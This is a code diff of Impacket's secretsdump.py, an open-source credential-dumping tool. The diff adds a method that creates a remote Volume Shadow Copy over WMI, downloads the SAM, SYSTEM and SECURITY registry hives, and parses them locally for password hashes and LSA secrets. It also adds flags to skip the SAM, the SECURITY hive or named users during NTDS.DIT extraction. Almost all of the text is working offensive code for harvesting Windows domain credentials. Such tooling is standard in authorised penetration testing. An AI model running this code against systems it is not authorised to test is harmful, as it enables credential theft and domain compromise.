@@ -1,7 +1,9 @@
 #!/usr/bin/env python
 # Impacket - Collection of Python classes for working with network protocols.
 #
-# Copyright (C) 2023 Fortra. All rights reserved.
+# Copyright Fortra, LLC and its affiliated companies 
+#
+# All rights reserved.
 #
 # This software is provided under a slightly modified version
 # of the Apache Software License. See the accompanying LICENSE file
@@ -96,6 +98,8 @@ class DumpSecrets:
         self.__securityHive = options.security
         self.__samHive = options.sam
         self.__ntdsFile = options.ntds
+        self.__skipSam = options.skip_sam
+        self.__skipSecurity = options.skip_security
         self.__history = options.history
         self.__noLMHash = True
         self.__isRemote = True
@@ -105,11 +109,15 @@ class DumpSecrets:
         self.__justDCNTLM = options.just_dc_ntlm
         self.__justUser = options.just_dc_user
         self.__ldapFilter = options.ldapfilter
+        self.__skipUser = options.skip_user
         self.__pwdLastSet = options.pwd_last_set
         self.__printUserStatus= options.user_status
         self.__resumeFileName = options.resumefile
         self.__canProcessSAMLSA = True
         self.__kdcHost = options.dc_ip
+        self.__remoteSSMethod = options.use_remoteSSMethod
+        self.__remoteSSMethodRemoteVolume = options.remoteSS_remote_volume
+        self.__remoteSSMethodDownloadPath = options.remoteSS_local_path
         self.__options = options
 
         if options.hashes is not None:
@@ -165,9 +173,44 @@ class DumpSecrets:
 
     def dump(self):
         try:
-            if self.__remoteName.upper() == 'LOCAL' and self.__username == '':
+            # Almost like LOCAL but create a Shadow Snapshot at target and download SAM, SYSTEM and SECURITY from the SS.
+            # Then, parse locally
+            if self.__remoteSSMethod:
                 self.__isRemote = False
                 self.__useVSSMethod = True
+                try:
+                    self.connect()
+                except Exception as e:
+                    if os.getenv('KRB5CCNAME') is not None and self.__doKerberos is True:
+                        # SMBConnection failed. That might be because there was no way to log into the
+                        # target system. We just have a last resort. Hope we have tickets cached and that they
+                        # will work
+                        logging.debug('SMBConnection didn\'t work, hoping Kerberos will help (%s)' % str(e))
+                        pass
+                    else:
+                        raise
+
+                # TESTING C:\\
+                # Should specify Volume with argument
+                self.__remoteOps = RemoteOperations(self.__smbConnection, self.__doKerberos, self.__kdcHost,
+                                                    self.__ldapConnection)
+                self.__remoteOps.setExecMethod(self.__options.exec_method)
+                sam_path, system_path, security_path = self.__remoteOps.createSSandDownload(self.__remoteSSMethodRemoteVolume,
+                                                                                            self.__remoteSSMethodDownloadPath)
+                self.__samHive = sam_path
+                self.__systemHive = system_path
+                self.__securityHive = security_path
+
+                localOperations = LocalOperations(self.__systemHive)
+                bootKey = localOperations.getBootKey()
+                if self.__ntdsFile is not None:
+                    # Let's grab target's configuration about LM Hashes storage
+                    self.__noLMHash = localOperations.checkNoLMHashPolicy()
+
+            elif self.__remoteName.upper() == 'LOCAL' and self.__username == '':
+                self.__isRemote = False
+                self.__useVSSMethod = True
+
                 if self.__systemHive:
                     localOperations = LocalOperations(self.__systemHive)
                     bootKey = localOperations.getBootKey()
@@ -227,38 +270,40 @@ class DumpSecrets:
             else:
                 # If RemoteOperations succeeded, then we can extract SAM and LSA
                 if self.__justDC is False and self.__justDCNTLM is False and self.__canProcessSAMLSA:
-                    try:
-                        if self.__isRemote is True:
-                            SAMFileName = self.__remoteOps.saveSAM()
-                        else:
-                            SAMFileName = self.__samHive
+                    if not self.__skipSam:
+                        try:
+                            if self.__isRemote is True:
+                                SAMFileName = self.__remoteOps.saveSAM()
+                            else:
+                                SAMFileName = self.__samHive
 
-                        self.__SAMHashes = SAMHashes(SAMFileName, bootKey, isRemote = self.__isRemote)
-                        self.__SAMHashes.dump()
-                        if self.__outputFileName is not None:
-                            self.__SAMHashes.export(self.__outputFileName)
-                    except Exception as e:
-                        logging.error('SAM hashes extraction failed: %s' % str(e))
+                            self.__SAMHashes = SAMHashes(SAMFileName, bootKey, isRemote = self.__isRemote)
+                            self.__SAMHashes.dump()
+                            if self.__outputFileName is not None:
+                                self.__SAMHashes.export(self.__outputFileName)
+                        except Exception as e:
+                            logging.error('SAM hashes extraction failed: %s' % str(e))
 
-                    try:
-                        if self.__isRemote is True:
-                            SECURITYFileName = self.__remoteOps.saveSECURITY()
-                        else:
-                            SECURITYFileName = self.__securityHive
+                    if not self.__skipSecurity:
+                        try:
+                            if self.__isRemote is True:
+                                SECURITYFileName = self.__remoteOps.saveSECURITY()
+                            else:
+                                SECURITYFileName = self.__securityHive
 
-                        self.__LSASecrets = LSASecrets(SECURITYFileName, bootKey, self.__remoteOps,
+                            self.__LSASecrets = LSASecrets(SECURITYFileName, bootKey, self.__remoteOps,
                                                        isRemote=self.__isRemote, history=self.__history)
-                        self.__LSASecrets.dumpCachedHashes()
-                        if self.__outputFileName is not None:
-                            self.__LSASecrets.exportCached(self.__outputFileName)
-                        self.__LSASecrets.dumpSecrets()
-                        if self.__outputFileName is not None:
-                            self.__LSASecrets.exportSecrets(self.__outputFileName)
-                    except Exception as e:
-                        if logging.getLogger().level == logging.DEBUG:
-                            import traceback
-                            traceback.print_exc()
-                        logging.error('LSA hashes extraction failed: %s' % str(e))
+                            self.__LSASecrets.dumpCachedHashes()
+                            if self.__outputFileName is not None:
+                                self.__LSASecrets.exportCached(self.__outputFileName)
+                            self.__LSASecrets.dumpSecrets()
+                            if self.__outputFileName is not None:
+                                self.__LSASecrets.exportSecrets(self.__outputFileName)
+                        except Exception as e:
+                            if logging.getLogger().level == logging.DEBUG:
+                                import traceback
+                                traceback.print_exc()
+                            logging.error('LSA hashes extraction failed: %s' % str(e))
 
                 # NTDS Extraction we can try regardless of RemoteOperations failing. It might still work
                 if self.__isRemote is True:
@@ -273,8 +318,9 @@ class DumpSecrets:
                                                noLMHash=self.__noLMHash, remoteOps=self.__remoteOps,
                                                useVSSMethod=self.__useVSSMethod, justNTLM=self.__justDCNTLM,
                                                pwdLastSet=self.__pwdLastSet, resumeSession=self.__resumeFileName,
-                                               outputFileName=self.__outputFileName, justUser=self.__justUser,
-                                               ldapFilter=self.__ldapFilter, printUserStatus=self.__printUserStatus)
+                                               outputFileName=self.__outputFileName, justUser=self.__justUser, 
+                                               skipUser=self.__skipUser, ldapFilter=self.__ldapFilter,
+                                               printUserStatus=self.__printUserStatus)
                 try:
                     self.__NTDSHashes.dump()
                 except Exception as e:
@@ -360,16 +406,24 @@ if __name__ == '__main__':
     parser.add_argument('-resumefile', action='store', help='resume file name to resume NTDS.DIT session dump (only '
                          'available to DRSUAPI approach). This file will also be used to keep updating the session\'s '
                          'state')
+    parser.add_argument('-skip-sam', action='store_true', help='Do NOT parse the SAM hive on remote system')
+    parser.add_argument('-skip-security', action='store_true', help='Do NOT parse the SECURITY hive on remote system')
     parser.add_argument('-outputfile', action='store',
                         help='base output filename. Extensions will be added for sam, secrets, cached and ntds')
     parser.add_argument('-use-vss', action='store_true', default=False,
-                        help='Use the VSS method instead of default DRSUAPI')
+                        help='Use the NTDSUTIL VSS method instead of default DRSUAPI')
     parser.add_argument('-rodcNo', action='store', type=int, help='Number of the RODC krbtgt account (only avaiable for Kerb-Key-List approach)')
     parser.add_argument('-rodcKey', action='store', help='AES key of the Read Only Domain Controller (only avaiable for Kerb-Key-List approach)')
     parser.add_argument('-use-keylist', action='store_true', default=False,
                         help='Use the Kerb-Key-List method instead of default DRSUAPI')
     parser.add_argument('-exec-method', choices=['smbexec', 'wmiexec', 'mmcexec'], nargs='?', default='smbexec', help='Remote exec '
                         'method to use at target (only when using -use-vss). Default: smbexec')
+    parser.add_argument('-use-remoteSSMethod', action='store_true',
+                        help='Remotely create Shadow Snapshot via WMI and download SAM, SYSTEM and SECURITY from it, the parse locally')
+    parser.add_argument('-remoteSS-remote-volume', action='store', default='C:\\',
+                        help='Remote Volume to perform the Shadow Snapshot and download SAM, SYSTEM and SECURITY')
+    parser.add_argument('-remoteSS-local-path', action='store', default='.',
+                        help='Path where download SAM, SYSTEM and SECURITY from Shadow Snapshot. It defaults to current path')
 
     group = parser.add_argument_group('display options')
     group.add_argument('-just-dc-user', action='store', metavar='USERNAME',
@@ -382,6 +436,8 @@ if __name__ == '__main__':
                         help='Extract only NTDS.DIT data (NTLM hashes and Kerberos keys)')
     group.add_argument('-just-dc-ntlm', action='store_true', default=False,
                        help='Extract only NTDS.DIT data (NTLM hashes only)')
+    group.add_argument('-skip-user', action='store', help='Do NOT extract NTDS.DIT data for the user specified. '
+                            'Can provide comma-separated list of users to skip, or text file with one user per line')
     group.add_argument('-pwd-last-set', action='store_true', default=False,
                        help='Shows pwdLastSet attribute for each NTDS.DIT account. Doesn\'t apply to -outputfile data')
     group.add_argument('-user-status', action='store_true', default=False,
